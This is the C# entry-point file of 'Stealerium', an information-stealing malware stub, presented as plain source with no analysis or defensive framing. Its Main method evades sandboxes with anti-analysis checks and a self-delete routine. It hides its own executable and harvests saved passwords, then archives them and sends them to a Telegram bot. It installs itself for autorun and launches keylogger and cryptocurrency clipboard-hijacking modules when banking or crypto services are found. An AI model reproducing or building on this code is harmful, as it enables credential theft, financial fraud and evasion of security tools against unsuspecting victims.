using System;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using Stealerium.Stub.Helpers;
using Stealerium.Stub.Modules;
using Stealerium.Stub.Modules.Implant;
using Stealerium.Stub.Target;

namespace Stealerium.Stub
{
    internal class Program
    {
        /// <summary>Defines the entry point of the application.</summary>
        [STAThread]
        private static async Task Main()
        {
            Thread wThread = null, cThread = null;

            // SSL setup
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            ServicePointManager.DefaultConnectionLimit = 9999;

            // Run AntiAnalysis modules first
            if (Config.AntiAnalysis == "1")
            {
                if (AntiAnalysis.Run())
                {
                    Logging.Log("AntiAnalysis: Detected suspicious environment. Initiating self-destruct.");
                    SelfDestruct.Melt();
                }
            }

            // Mutex check (to avoid running multiple instances)
            MutexControl.Check();
            Logging.Log("Program: Mutex check completed.");

            // Initialize configuration
            Logging.Log("Program: Starting configuration initialization...");
            try 
            {
                await Task.Run(Config.InitAsync);
                Logging.Log("Program: Configuration initialized successfully.");
            }
            catch (Exception ex)
            {
                Logging.Log($"Program: Failed to initialize configuration: {ex.Message}\nStack trace: {ex.StackTrace}");
                throw; // Re-throw to ensure the program exits
            }

            // Change working directory to appdata
            Logging.Log("Program: Changing working directory...");
            Directory.SetCurrentDirectory(Paths.InitWorkDir());

            // Hide executable on first start
            try 
            {
                Logging.Log("Program: Starting startup check...");
                var isFromStartup = Startup.IsFromStartup();
                Logging.Log($"Program: Checking if running from startup: {isFromStartup}");
                
                if (!isFromStartup)
                {
                    Logging.Log("Program: Not running from startup, hiding file...");
                    Startup.HideFile();
                    Logging.Log("Program: File hidden successfully");
                }
                else
                {
                    Logging.Log("Program: Already running from startup, skipping hide");
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"Program: Error during startup check/file hiding: {ex.Message}\nStack trace: {ex.StackTrace}");
                throw;
            }

            // If Telegram API or ID is invalid, self-destruct
            try
            {
                Logging.Log("Program: Checking Telegram configuration...");
                if (Config.TelegramAPI.Contains("---") || Config.TelegramID.Contains("---"))
                {
                    Logging.Log("Program: Invalid Telegram configuration, initiating self-destruct");
                    SelfDestruct.Melt();
                }
                Logging.Log("Program: Telegram configuration is valid");
            }
            catch (Exception ex)
            {
                Logging.Log($"Program: Error checking Telegram configuration: {ex.Message}\nStack trace: {ex.StackTrace}");
                throw;
            }

            // Start delay (if configured)
            if (Config.StartDelay == "1")
                StartDelay.Run();

            // Test Telegram API token
            if (!await Telegram.TokenIsValidAsync().ConfigureAwait(false))
            {
                Logging.Log("SelfDestruct triggered because the Telegram API token is invalid.");
                SelfDestruct.Melt();
            }

            // Steal passwords and send the report
            var passwords = await Passwords.SaveAsync();
            var archive = Filemanager.CreateArchive(passwords);
            await Telegram.SendReportAsync(archive).ConfigureAwait(false);

            // Install to startup if necessary and not already installed
            if (Config.Autorun == "1" && !Startup.IsInstalled() && (Counter.BankingServices || Counter.CryptoServices || Counter.PornServices))
            {
                if (!Startup.IsFromStartup())
                    Startup.Install();
            }

            // Run keylogger module if necessary
            if (Config.KeyloggerModule == "1" && Config.Autorun == "1" && (Counter.BankingServices || Counter.Telegram))
            {
                Logging.Log("Starting keylogger modules...");
                wThread = WindowManager.MainThread;
                wThread.SetApartmentState(ApartmentState.STA);
                wThread.Start();
            }

            // Run clipper module if necessary
            if (Config.ClipperModule == "1" && Config.Autorun == "1" && Counter.CryptoServices)
            {
                Logging.Log("Starting clipper modules...");
                cThread = ClipboardManager.MainThread;
                cThread.SetApartmentState(ApartmentState.STA);
                cThread.Start();
            }

            // Wait for threads to finish
            if (wThread != null && wThread.IsAlive)
                wThread.Join();
            if (cThread != null && cThread.IsAlive)
                cThread.Join();

            // Self-destruct if not running from startup
            if (!Startup.IsFromStartup())
            {
                Logging.Log("SelfDestruct triggered because the program was not started from startup.");
                SelfDestruct.Melt();
            }
        }
    }
}
